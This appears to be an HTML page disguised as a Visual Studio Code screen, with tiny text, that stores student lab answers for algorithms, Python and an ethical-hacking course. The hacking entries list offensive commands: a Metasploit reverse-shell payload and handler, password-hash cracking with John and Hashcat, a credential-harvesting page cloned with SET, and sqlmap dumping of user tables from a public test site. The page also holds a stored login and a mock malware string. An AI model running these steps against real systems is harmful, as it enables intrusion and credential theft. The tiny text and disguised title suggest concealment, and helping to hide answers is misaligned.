@@ -1,0 +1,980 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Visual Studio Code</title>
+  
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" href="vslogo.png">
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f0f0f0;
+    }
+
+    /* Logo in top-right corner */
+    .logo {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      width: 40px;
+      height: 40px;
+    }
+
+    .container {
+      width: 100%;
+      /* margin: 80px auto 40px auto; */
+      background-color: #ffffff;
+      /* padding: 30px; */
+      border-radius: 0%;
+      /* box-shadow: 0 0 10px rgba(0,0,0,0.2); */
+      justify-content: center;
+    }
+
+    h1, h2 {
+      text-align: center;
+      color: #333;
+      font-size: 5px;
+    }
+
+    .subject, .program {
+      cursor: pointer;
+      color: #007BFF;
+      margin: 10px 0;
+      text-align: center;
+      font-size: 5px;
+
+    }
+
+    .subject:hover, .program:hover {
+      text-decoration: underline;
+    }
+
+    #programs, #codeDisplay {
+      margin-top: 20px;
+    }
+
+    pre {
+      background: #f0f0f0;
+      padding: 10px;
+      border: 1px solid #ccc;
+      white-space: pre-wrap;
+      font-size: 5px;
+    }
+
+    .image-section {
+      text-align: center;
+      /* margin-top: 30px; */
+    }
+
+    .image-section img {
+      max-width: 100%;        /* Better for responsiveness */
+      height: auto;
+      /* border-radius: 0px; */
+      display: block;
+      margin: 0 auto;
+    }
+  </style>
+        <style>
+          html, body {
+              height: 100%;
+              margin: 0;
+          }
+          img {
+              width: 100%;
+              height: 100%;
+              object-fit: cover; /* Ensures the image covers the whole screen */
+          }
+      </style>
+</head>
+<body>
+
+  <!-- Logo in top-right corner -->
+  <img src="vscode.png" alt="Parikshak">
+
+  <div class="container">
+    <h1>Select a Subject</h1>
+
+    <div id="subjects">
+      <div class="subject" onclick="showPrograms('AOA')">AOA</div>
+      <div class="subject" onclick="showPrograms('EH')">EH</div>
+      <div class="subject" onclick="showPrograms('DBMS')">DBMS</div>
+      <div class="subject" onclick="showPrograms('PYTHON')">PYTHON</div>
+    </div>
+
+    <div id="programs"></div>
+    <div id="codeDisplay"></div>
+
+<script>
+// Programs and their codes
+const data = {
+  AOA: {
+    "Naïve String-Matching": `
+import java.util.Scanner;
+public class NaiveStringMatching {
+public static void naiveStringMatch(String text, String pattern){
+int textLength = text.length();
+int patternLength = pattern.length();
+boolean found = false;
+for(int i=0; i<= textLength - patternLength; i++){
+int j;
+for(j=0; j< patternLength; j++){
+if(text.charAt(i+j)!= pattern.charAt(j))
+{break;}}
+if(j== patternLength){
+ System.out.println(+i);
+found = true; }}
+if(!found){ }}
+public static void main(String[] args){
+ Scanner scanner = new Scanner(System.in);
+ String text = scanner.nextLine();
+ String pattern = scanner.nextLine();
+naiveStringMatch(text, pattern);
+scanner.close();}}
+`
+},
+  
+EH: {
+    "exp 1 Discover digital footprints found both online and in metadata using appropriate tools": `-- have i been pawned
+	put your email id and check
+Google Search( eg your name or celebrity name)
+ipinfo
+	put any ip address( eg. 1.39.25.144, 1.0.0.8)
+waybackmachine
+	sakec.ac.in(any url)
+`,
+
+
+
+
+"Practice investigative procedures including bagging and tagging evidence, following the chain of custody, and photographing evidence at the scene.": 
+`1.2 Course Outcome:
+Gain familiarity with various tools and equipment used in digital evidence handling, including
+bagging, tagging, photographing, and maintaining the chain of custody.
+1.3 Lab Objective:
+● Explore and understand the purpose and usage of equipment and materials for
+handling digital evidence.
+● Emphasize the importance of proper evidence handling and documentation techniques.
+
+1.4 Requirement:
+● Digital Crime Scene Setup: Mock evidence like a laptop, external hard drive,
+smartphone, USB drive, or handwritten notes.
+● Evidence Bags: Anti-static bags for digital devices and standard bags for physical
+items.
+● Evidence Tags and Labels: Pre-printed or blank labels for identification.
+● Digital Camera: For capturing high-resolution photographs with timestamps.
+● Chain of Custody Forms: To log the evidence handling process.
+● Personal Protective Equipment (PPE): Gloves to prevent contamination.
+● Permanent Markers: For labeling evidence bags.
+● Notebooks and Pens: For documentation.
+● Incident Report Form: For compiling investigation details.
+
+In digital forensics, evidence integrity is crucial for its admissibility in court. Proper handling,
+including bagging, tagging, and maintaining the chain of custody, ensures evidence is not
+tampered with or altered.
+● Bagging and Tagging: The process of securely placing evidence in appropriate bags
+and labeling it with critical information such as case number, date, time, and
+investigator details.
+● Chain of Custody: A detailed log that records every individual who handled the
+evidence, the time of transfer, and the purpose.
+● Photographing Evidence: High-resolution images of the evidence are captured at the
+crime scene, showing its original state and surroundings.
+
+`,
+
+"Perform Vulnerability Assessment using Various Vulnerability Assessment Tools": 
+`
+National Vulnerability Database (NVD) https://nvd.nist.gov/
+Common Vulnerabilities and Exposures (CVE) https://cve.mitre.org
+
+CVSS Calculator (https://www.first.org/cvss/calculator)
+Base Score (Exploitability & Impact)
+■ Temporal Score (Exploit Code Maturity, Remediation Level, Report
+Confidence)
+■ Environmental Score (Modified impact based on specific environment)
+
+
+`,
+
+
+"exp 4 Perform Vulnerability Research using Vulnerability Scoring Systems and Databases:": 
+` Nessus:
+1. Click on the Nessus download link and install the software. 
+Link: https://www.tenable.com/downloads/nessus?loginAttempted=true
+2. Once the installation is complete, a browser window will open automatically to the localhost website.
+3. Click on “Connect via SSL.”
+4. If you see a “connection not secure” warning, click “Advanced” and then “Proceed.”
+5. Click “Continue”, then choose “Register for Nessus Essentials.”
+6. Enter your details and click “Register.”
+7. You will receive an activation code—take a screenshot just in case (though it’s usually not needed).
+8. Click “Continue”, then create your own username and password. Click “Submit.”
+9. Nessus will now download its plugins. Wait for this process to complete.
+10. Once the main Nessus interface loads, look for a spinning icon at the top of the page—this means additional plugins are still being installed.
+11. Wait until all plugin installations are complete. Only then will you be able to create a new scan.
+
+(Rather than installing nessus if not present, then go to this link and enter my username and password. 
+Link: https://localhost:8834/#/scans/folders/my-scans
+Username - Mitali
+Password - Mitali)
+
+12. Once completed create new scan
+13. Click on web application tests
+14. Enter name eg., Test and in target enter a website eg., google.com
+15. Click on Save. After that click on play icon to launch scanning. 
+16. Once done, generate its report
+
+ Nessus Vulnerability Scanner 
+Nessus is a network vulnerability scanner that identifies security weaknesses, outdated software, and misconfigurations on a host or network.
+✅ Steps:
+1. Download & install Nessus
+2. Register for Nessus Essentials 
+3. After setup:
+4. Click New Scan → Choose Web Application Tests
+5. Enter scan name (e.g., Test)
+6. Set target IP: 192.168.56.102
+7. Save and click ▶️ to launch the scan
+8. View and generate the vulnerability report.
+
+Nessus (Vulnerability Scanner)
+Nessus is a powerful vulnerability assessment tool that scans systems for security flaws, missing
+patches, and configuration issues. It provides detailed reports and risk assessments, making it
+widely used in enterprise security
+`,
+
+
+
+"exp 5 Perform an Active online attack to crack systems password":
+ `john
+echo -n "1234a" | md5sum
+echo -n "123" | md5sum
+nano hashes.txt
+
+
+To exit - ctrl x
+john --format=raw-md5 hashes.txt
+john --show --format=raw-md5 hashes.txt
+cat hashes.txt 
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
+
+`,
+
+
+"Escalate Privileges using Privilege Escalation Tools such as: Metasploit Framework, PowerShell Empire.":
+`open kali Linux and run each command 
+
+ifconfig
+
+ping (10.0.2.15) enter ip from above received i net
+sudo -i
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15
+msfconsole 
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+
+set LPORT 10.0.2.15
+set LPORT 12345
+set LHOST 10.0.2.15
+exploit
+`,
+
+
+"Use Steganography tools to Hide Data. Recommended Tools: Steghide,OpenStego,SteganoG.": 
+`
+🔸 Steghide Steps 
+1. Download steghide
+   Command:
+   sudo apt install steghide
+
+2. Go to Desktop
+   Command:
+   cd Desktop
+
+3. Download an image using Firefox
+   - Example: Save a hacker.jpeg image to Desktop.
+
+4. Create a secret text file
+   Command:
+   echo "This is execution of steghide in kali linux" > secret_key.txt
+
+5. See the files
+   Command:
+   ls
+
+6. View the contents of the txt file
+   Command:
+   cat secret_key.txt
+
+7. Hide the secret file inside the image
+   Command:
+   steghide embed -cf hacker.jpeg -ef secret_key.txt
+   #cf = cover file (image), ef = embedded file (text)
+
+8. Enter passphrase
+   - Example: pass
+
+9. Check file list again
+   Command:
+   ls -l         
+   #The -l option in ls -l shows a detailed (long) listing of files, including permissions, owner, size, and modification date.
+
+10. Extract the hidden text from image
+    Command:
+    steghide extract -sf hacker.jpeg
+
+11. Read the extracted text
+    Command:
+    cat secret_key.txt
+
+12. Done ✅`,
+
+
+"exp 8 Explore Social Engineering attacks using SET Toolkit.": 
+`
+1.sudo setoolkit
+
+2.Accept the disclaimer by typing y and press Enter
+
+3.Select 1 for social engineering and Click Enter
+
+4.select option 2 i.e. Website Attack Vectors from the menu and click enter.
+
+5.select option 3 i.e. ‘Credential Harvester Attack Method’ from the menu
+
+6.select option 1 i.e. ‘Web Templates’ and click enter.
+
+7.select option 2 and click enter
+
+8.select option 2 i.e. Google website to clone its template
+
+9.Enter Y and click Enter
+
+10.open firefox and enter "http://127.0.0.1"
+
+11.Enter the details below:
+	USERNAME: victim@gmail.com
+	PASSWORD: password123
+
+`,
+
+
+"exp 9 Perform static and dynamic malware analysis. ": 
+`A) Static malware Analysis(on Kali Linux)
+
+1. echo "This is a harmless file for static malware analysis practice." > malware_sample.exe
+
+2. echo -e "cmd.exe /c start\nhttp://malicious-site.com\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" >> malware_sample.exe
+
+3. file malware_sample.exe
+
+4. cat malware_sample.exe
+
+5. strings malware_sample.exe | less
+
+6. open new terminal and enter: sha256sum malware_sample.exe
+
+Next
+Open virustotal on firefox
+upload file malware_sample.exe
+
+Done
+
+
+Static Malware Analysis:
+Static analysis examines malware code without actually running it, focusing on the code's
+structure, strings, and signatures.
+Techniques:
+● Signature-based detection: Comparing the malware's digital footprint against a
+database of known malicious signatures.
+● Hashing: Calculating a unique identifier for the malware file to identify duplicates
+or variations.
+● Fuzzing: Testing the malware with various inputs to identify potential
+vulnerabilities.
+● Disassembly/Reverse Engineering: Examining the disassembled code to
+understand the malware's functionality
+
+`,
+
+
+"exp 10 To detect SQL injection vulnerabilities using automated tools like SQLMap and Burp Scanner, identifying injection points and exploiting database vulnerabilities.":
+ `testing the below url
+ http://testphp.vulnweb.com/
+
+Open kali Linux
+
+1.sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --crawl 2 --batch
+
+-u: target URL
+--crawl 2: follows 2 levels of links to find inputs
+--batch: runs in auto mode without asking questions
+
+2.Use Extra Detection Options
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --crawl 2 --technique=U --threads 5 --level 2 --risk 2 --batch
+
+--technique=U: use UNION-based injections
+--threads 5: faster scanning
+--risk and --level: increase the depth of testing
+
+3. 
+1.Enumerate & Exploit
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --current-user --current-db --hostname --batch
+
+2.List all databases:
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
+
+3.Pick a database (e.g., acuart) and list its tables:
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch
+
+4.Pick a table (e.g., users) and list columns:
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
+
+5.Dump the data:
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
+
+4.Save the Output to a Report
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --crawl 2 --output-dir="sqlmap_report" --batch
+
+
+
+SQL injection is a code injection technique that can compromise your database. It is one of the most common webnhacking techniques . SQL injection is the injection of malicious code into SQL statements via web page input . The hacker can retrieve all the user data present in the database such as user details, credit card information, and social security numbers, and can also gain access to protected areas like the administrator portal. It is also possible to delete ser data from the tables . To perform a SQL injection attack, an attacker can use web page inputs as statements through SQL commands to manipulate the application’s web server . The most timeless and effective method to detect SQL injection
+vulnerabilities is penetration testing . SQLmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL Injection flaws and taking over database servers. SQLMap is a modular framework written in Python. It can detect most of the SQL injection flaws across the different platforms. The following databases are supported: MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase and SAP MaxDB. After exploitation is successful, it can enumerate databases and tables and also can dump database and tables. 
+
+`,
+
+
+"exp 11 Perform File and Text Message Encryption using a freely available tool.": 
+`download and install veracrypt
+https://launchpad.net/veracrypt/trunk/1.26.20/+download/VeraCrypt%20Setup%201.26.20.exe
+
+1. Create Volume
+	Click Next
+	Click Next
+
+
+2.Click select file
+Go to C: drive
+create folder MyVolume.hc and save
+Click Next
+In Encryption Options
+ select Encryption option AES
+ hash algorithm option SHA-512
+click Next
+
+3.Volume Size 250 MB
+ Click Next
+
+4. Enter Password
+  Click Next
+
+5. In Volume Format
+  Click Format
+
+The volume has been successfully created
+ click ok
+ click exit
+
+6. Select volume M:
+   Select file 
+   MyVolume.hc
+Click open
+Click Mount
+Enter Password
+Click ok select PRF: HMAC-SHA-512
+
+You can now see the drive in file explorer
+
+done 
+
+now dismount
+
+
+Encryption is the process of converting plaintext into ciphertext to protect
+data from unauthorized access. It ensures confidentiality and integrity of the information.
+There are two primary types of encryption:
+● Symmetric Encryption: Uses the same key for encryption and decryption (e.g., AES,
+DES).
+● Asymmetric Encryption: Uses a pair of keys – public key for encryption and private
+key for decryption (e.g., RSA, ECC).
+Encryption is widely used for securing files, emails, and communication. Freely available
+tools allow users to encrypt data without requiring extensive cryptographic knowledge.
+
+
+`,
+
+
+"exp 12 Perform Cryptanalysis using Various Cryptanalysis Tools like Hashcat": 
+`
+1.  Install Hashcat
+sudo apt update
+sudo apt install hashcat -y
+
+
+2. hash-identifier
+	5f4dcc3b5aa765d61d8327deb882cf99
+
+if needed unzip using gunzip /usr/share/wordlists/rockyou.txt.gz
+
+
+3. echo '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt
+
+4. Check ls /usr/share/wordlists/rockyou.txt
+
+5. hashcat -m 0 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
+
+6. hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a
+
+7. hashcat -m 0 -a 6 hash.txt /usr/share/wordlists/rockyou.txt ?d?d?d
+
+8. cat cracked.txt
+
+
+
+Cryptanalysis is the study of analyzing and breaking cryptographic security systems. Hash
+functions are commonly used in password storage, and attackers use cryptanalysis tools to
+recover plaintext passwords from hashes.
+Hashcat is a widely used password recovery tool that supports multiple hashing algorithms.
+It employs various attack techniques:
+● Dictionary Attack: Tries a list of pre-defined words.
+● Brute-force Attack: Generates and tests all possible combinations.
+● Hybrid Attack: Combines dictionary words with additional characters.
+● Mask Attack: Targets passwords with known structures.
+
+Common hash types and their identifiers:
+● MD5: -m 0
+● SHA-1: -m 100
+● SHA-256: -m 1400
+● NTLM (Windows Passwords): -m 1000
+● WPA/WPA2 (Wi-Fi Passwords): -m 22000
+
+
+`,
+
+
+"exp 13 ": 
+`Experiment 13
+13.1 Aim: To conduct a comprehensive research-based analysis of a selected cybersecurity
+incident, focusing on the technical, organizational, and policy-level failures, with the objective of
+understanding security challenges and proposing preventive measures.
+13.2 Course Outcome: To analyze cybersecurity incidents, understand attack methods and
+vulnerabilities, and assess their technical, legal, and ethical impacts.
+13.3 Lab Objective: students will be able to analyze real-world cyber incidents, identify
+technical and organizational failures, and recommend effective security measures.
+13.4 Requirement (Research-Based Study):
+● News Outlets: Wired, The Verge, TechCrunch, BBC, Economic Times, etc.
+● Cybersecurity Blogs: KrebsOnSecurity, Palo Alto Unit42, Rapid7, Cisco Talos
+● Technical Reports: From US-CERT, CISA, MITRE, and NIST
+● Incident Analysis: Case studies published by SANS Institute, OWASP, Cloud Security Alliance
+● Whitepapers: From security vendors (McAfee, Symantec, FireEye, etc.)
+● Academic Papers: IEEE, SpringerLink, Google Scholar (for deeper technical insight)
+1. Introduction
+Purpose of the Study:
+This report aims to analyze the Capital One data breach, highlighting the technical,
+organizational, and policy-level failures that enabled the incident. The goal is to extract lessons
+and recommend preventive measures applicable to modern cloud infrastructures.
+Background:
+Capital One, a major U.S. bank, adopted AWS cloud services to support its digital operations.
+While cloud migration offers scalability and efficiency, it also introduces new security
+challenges—especially around misconfigured services and access management.
+2. Breach Overview
+Timeline:
+● March 2019: Unauthorized access to Capital One’s cloud resources begins.
+● July 17, 2019: Capital One is notified by an external security researcher.
+● July 29, 2019: Capital One discloses the breach publicly.
+Key Player:
+● Paige Thompson, a former AWS employee, exploited misconfigured cloud resources
+using knowledge of AWS infrastructure.
+Services Affected:
+● Over 100 million customer records were compromised, including names, addresses,
+credit scores, and social security numbers.
+3. Technical Breakdown
+Metadata Service Vulnerability:
+The attacker exploited a Server-Side Request Forgery (SSRF) vulnerability in a web
+application firewall (WAF). This allowed access to AWS EC2 instance metadata, including IAM
+role credentials.
+Data Accessed:
+● Personally identifiable information (PII)
+● Social Security Numbers (SSNs)
+● Credit card application data
+● Bank account numbers (in limited cases)
+4. Security Failures
+Technical Failures:
+● Misconfigured WAF allowing SSRF
+● Overly permissive IAM roles
+● Lack of fine-grained access controls
+Organizational Failures:
+● Insufficient internal security audits
+● Lack of proper configuration monitoring
+● Inadequate incident response preparedness
+Logging/Monitoring Issues:
+While AWS did provide logs, they were not actively monitored or integrated with SIEM tools to
+detect unusual access patterns in real-time.
+6. Recommendations
+● Implement least privilege access for IAM roles
+● Regular audits of cloud configurations (CSPM tools)
+● Monitor metadata access using AWS GuardDuty or CloudTrail
+● Patch known SSRF vulnerabilities in WAFs
+● Conduct red-team assessments and cloud-specific pentests
+7. Legal and Regulatory Implications
+● Capital One was fined $80 million by the Office of the Comptroller of the Currency
+(OCC).
+● Multiple class-action lawsuits followed, citing failure to protect consumer data.
+● Raised concerns under GDPR, CCPA, and GLBA regarding cloud data handling and
+third-party risk.
+8. Conclusion
+Lessons Learned:
+● Cloud misconfigurations can lead to catastrophic breaches.
+● Insider knowledge can amplify attacks.
+● Real-time monitoring and proactive threat detection are essential.
+Application to Current Cloud Deployments:
+● Shift-left security: integrate security in development pipelines.
+● Use of Zero Trust Architecture (ZTA).
+● Continuous training for security teams in cloud security principles.
+9. References
+(Include a mix of the following, properly cited)
+● Wired article: “The Capital One Hacker Was Caught Thanks to Slack”
+● US-CERT alert on cloud misconfigurations
+● CISA advisory on SSRF vulnerabilities
+● IEEE paper on cloud access security
+● Blog post from Palo Alto’s Unit42 on SSRF in AWS
+
+`
+  },
+  
+DBMS: {
+    "FCFS Scheduling": `// First Come First Serve Scheduling
+public class FCFS {
+    public static void main(String[] args) {
+        // Code for FCFS scheduling
+    }
+}`
+  },
+  
+PYTHON: {
+    "Basic Data Types, Operators, and Control Statements": 
+    ` 
+a = int(input("Enter an integer: ")) 
+b = float(input("Enter a float: ")) 
+c = input("Enter a string: ") 
+print("Integer:", a) 
+print("Float:", b) 
+print("String:", c)  
+print("Addition:", a + b) 
+print("Multiplication:", a * b) 
+if a > b: 
+    print("Integer is greater than float.") 
+elif a == b: 
+    print("Both are equal.") 
+else: 
+    print("Float is greater than integer.") `,
+
+"Lists Tuples and Dictionaries": 
+    `names = input("Enter names (comma separated): ").split(',') 
+ages = input("Enter corresponding ages (comma separated): ").split(',') 
+ages = [int(age) for age in ages] 
+info = dict(zip(names, ages)) 
+print("List of names:", names) 
+print("Tuple of ages:", tuple(ages)) 
+print("Dictionary (name: age):") 
+for name, age in info.items(): 
+    print(name, ":", age) `,
+
+"Classes and Inheritance (Minimal Class Use Required)": 
+    `class Person: 
+    def __init__(self, name): 
+        self.name = name 
+    def show(self): 
+        print("Name:", self.name) 
+class Student(Person): 
+    def __init__(self, name, roll): 
+        super().__init__(name) 
+        self.roll = roll 
+    def display(self): 
+        print("Roll Number:", self.roll) 
+name = input("Enter your name: ") 
+roll = input("Enter your roll number: ") 
+s = Student(name, roll) 
+s.show() 
+s.display()`,
+
+"Custom Exception with User Input": 
+    `class NegativeNumberError(Exception): 
+    pass 
+try: 
+    num = int(input("Enter a positive number: ")) 
+    if num < 0: 
+        raise NegativeNumberError("Negative number entered.") 
+    print("Number is valid:", num) 
+except ValueError: 
+    print("Invalid input. Please enter an integer.") 
+except NegativeNumberError as e: 
+    print("Error:", e) `,
+
+
+"File Read, Append, and Display": 
+    `filename = "example.txt" 
+data = input("Enter text to append to file: ") 
+with open(filename, "a") as file: 
+    file.write(data + "\n") 
+print("\n--- File Content ---") 
+with open(filename, "r") as file: 
+    content = file.read() 
+    print(content) `
+,
+
+"Count Lines, Words, Characters in File": 
+    ` 
+filename = "example.txt" 
+with open(filename, "r") as file: 
+    content = file.read() 
+lines = content.splitlines() 
+words = content.split() 
+characters = len(content) 
+print("Number of lines:", len(lines)) 
+print("Number of words:", len(words)) 
+print("Number of characters:", characters)`,
+
+
+"Simple Tkinter GUI (Labels, Entry, Button)": 
+    `import tkinter as tk 
+root = tk.Tk() 
+root.title("Simple GUI") 
+root.geometry("300x150") 
+label = tk.Label(root, text="Enter your name:") 
+label.pack() 
+entry = tk.Entry(root) 
+entry.pack() 
+output = tk.Label(root, text="") 
+output.pack() 
+def show_message(): 
+    name = entry.get() 
+    output.config(text="Hello, " + name) 
+button = tk.Button(root, text="Submit", command=show_message) 
+button.pack() 
+root.mainloop()` ,
+
+"Stack and Queue using Lists": 
+    `stack = [] 
+queue = [] 
+item = input("Enter item to push to stack: ") 
+stack.append(item) 
+print("Stack after push:", stack) 
+stack.pop() 
+print("Stack after pop:", stack) 
+item = input("Enter item to enqueue to queue: ") 
+queue.append(item) 
+print("Queue after enqueue:", queue) 
+queue.pop(0) 
+print("Queue after dequeue:", queue) ` ,
+
+"*SQLite CRUD Program": 
+    `import sqlite3 
+conn = sqlite3.connect("records.db") 
+cursor = conn.cursor() 
+cursor.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY 
+KEY, name TEXT)") 
+while True: 
+    print("\n1. Insert\n2. View\n3. Update\n4. Delete\n5. Exit") 
+    ch = input("Enter your choice: ") 
+    if ch == '1': 
+        name = input("Enter name: ") 
+        cursor.execute("INSERT INTO users (name) VALUES (?)", (name,)) 
+        conn.commit() 
+        print("Record added.") 
+    elif ch == '2': 
+        cursor.execute("SELECT * FROM users") 
+        for row in cursor.fetchall(): 
+            print(row) 
+    elif ch == '3': 
+        id = input("Enter ID to update: ") 
+        name = input("Enter new name: ") 
+        cursor.execute("UPDATE users SET name=? WHERE id=?", (name, id)) 
+        conn.commit() 
+        print("Record updated.") 
+    elif ch == '4': 
+        id = input("Enter ID to delete: ") 
+        cursor.execute("DELETE FROM users WHERE id=?", (id,)) 
+        conn.commit() 
+        print("Record deleted.") 
+    elif ch == '5': 
+        break 
+    else: 
+        print("Invalid choice.") 
+conn.close() ` ,
+
+"Client-Server Communication with Sockets": 
+    `*Server:* 
+import socket 
+server_socket = socket.socket() 
+server_socket.bind(("localhost", 12345)) 
+server_socket.listen(1) 
+print("Waiting for connection...") 
+conn, addr = server_socket.accept() 
+print("Connected to:", addr) 
+msg = conn.recv(1024).decode() 
+print("Client says:", msg) 
+conn.send("Hello from server!".encode()) 
+conn.close() 
+ 
+*Client:* 
+import socket 
+client_socket = socket.socket() 
+client_socket.connect(("localhost", 12345)) 
+client_socket.send("Hello from client!".encode()) 
+msg = client_socket.recv(1024).decode() 
+print("Server says:", msg) 
+client_socket.close() ` ,
+
+"Web Scraping with requests": 
+    `import requests 
+url = input("Enter a URL (e.g., https://example.com): ") 
+try: 
+    response = requests.get(url) 
+    print("Status code:", response.status_code) 
+    print("\n--- First 500 characters of page content ---\n") 
+    print(response.text[:500]) 
+except Exception as e: 
+    print("Failed to fetch the page:", e) ` ,
+
+"Django Form with Input Validation (Regex)": 
+    `open terminal and run the below commands one by one 
+python -m venv venv 
+venv\Scripts\activate 
+pip install django 
+django-admin startproject myproject 
+cd myproject 
+python manage.py startapp myapp 
+open folder myproject 
+create folder (templates) in myproject 
+create file (index.html) in templates, add code( in the code add your 
+name and roll no) 
+
+&lt;!DOCTYPE html&gt; 
+&lt;html lang="en"&gt; 
+&lt;head&gt; 
+    &lt;meta charset="UTF-8"&gt; 
+    &lt;meta name="viewport" content="width=device-width, initial scale=1.0"&gt; 
+    &lt;title&gt;Student Profile - Name&lt;/title&gt; 
+    &lt;style&gt; 
+        body { 
+            font-family: Arial, sans-serif; 
+            background-color: #f4f4f9; 
+            margin: 0; 
+            padding: 0; 
+        } 
+        .container { 
+            max-width: 600px; 
+            margin: 50px auto; 
+            padding: 20px; 
+            background-color: #fff; 
+            border-radius: 10px; 
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); 
+            text-align: center; 
+        } 
+        .container h1 { 
+            color: #333; 
+            font-size: 2em; 
+        } 
+        .details { 
+            margin-top: 20px; 
+            font-size: 1.2em; 
+            color: #555; 
+        } 
+        .details span { 
+            font-weight: bold; 
+            color: #222; 
+        } 
+        .footer { 
+            margin-top: 30px; 
+            font-size: 1em; 
+            color: #888; 
+        } 
+    &lt;/style&gt; 
+&lt;/head&gt; 
+&lt;body&gt; 
+    &lt;div class="container"&gt; 
+        &lt;h1&gt;Student Profile&lt;/h1&gt; 
+        &lt;div class="details"&gt; 
+            &lt;p&gt;&lt;span&gt;Name:&lt;/span&gt; ADD YOUR NAME HERE&lt;/p&gt; 
+            &lt;p&gt;&lt;span&gt;Roll Number:&lt;/span&gt; ADD ROLL NO&lt;/p&gt; 
+            &lt;p&gt;&lt;span&gt;Class:&lt;/span&gt; SYCS (Second Year Computer Science)&lt;/p&gt; 
+            &lt;p&gt;&lt;span&gt;College:&lt;/span&gt; Shah and Anchor Kachhi Engineering College&lt;/p&gt; 
+        &lt;/div&gt; 
+        &lt;div class="footer"&gt; 
+            &lt;p&gt;&copy; 2025&lt;/p&gt; 
+        &lt;/div&gt; 
+    &lt;/div&gt; 
+&lt;/body&gt; 
+&lt;/html&gt;
+
+go to settings.py in myproject  
+ in installed apps ('myapp',) 
+go to manage.py 
+go to terminal run command ( python manage.py runserver) 
+Starting development server at http://127.0.0.1:8000/ (click on this http://127.0.0.1:8000/) 
+or 
+go to index.html and click on go live`
+  },
+};
+
+// Show programs based on selected subject
+function showPrograms(subject) {
+  const programsDiv = document.getElementById('programs');
+  const codeDisplay = document.getElementById('codeDisplay');
+  codeDisplay.innerHTML = ''; // Clear previous code
+  let html = '<h2>Programs:</h2>';
+  for (const programName in data[subject]) {
+    html += `<div class="program" onclick="showCode('${subject}', '${programName}')">${programName}</div>`;
+  }
+  programsDiv.innerHTML = html;
+}
+
+// Show code when a program is clicked
+function showCode(subject, programName) {
+  const codeDisplay = document.getElementById('codeDisplay');
+  const code = data[subject][programName];
+  const escapedCode = code.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+
+  codeDisplay.innerHTML = `
+    <h2>${programName} Code:</h2>
+    <div style="position: relative;">
+      <button onclick="copyCode()" style="position: absolute; top: 10px; right: 10px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer;height: 10px;width: 25px; font-size: 5px;">Copy</button>
+      <pre id="codeBlock">${escapedCode}</pre>
+    </div>
+  `;
+}
+
+function copyCode() {
+  const codeText = document.getElementById('codeBlock').innerText;
+  navigator.clipboard.writeText(codeText).then(() => {
+    const copiedMsg = document.createElement('div');
+    copiedMsg.innerText = 'Copied!';
+    copiedMsg.style.position = 'fixed';
+    copiedMsg.style.bottom = '20px';
+    copiedMsg.style.right = '20px';
+    copiedMsg.style.backgroundColor = '#4caf50';
+    copiedMsg.style.color = '#fff';
+    copiedMsg.style.padding = '10px 15px';
+    copiedMsg.style.borderRadius = '5px';
+    copiedMsg.style.boxShadow = '0 2px 6px rgba(0,0,0,0.2)';
+    copiedMsg.style.zIndex = '1000';
+    document.body.appendChild(copiedMsg);
+
+    setTimeout(() => {
+      copiedMsg.remove();
+    }, 100); // Disappears after 2 seconds
+  }).catch(err => {
+    console.error('Failed to copy code:', err);
+  });
+}
+
+
+</script>
+
+</body>
+</html>
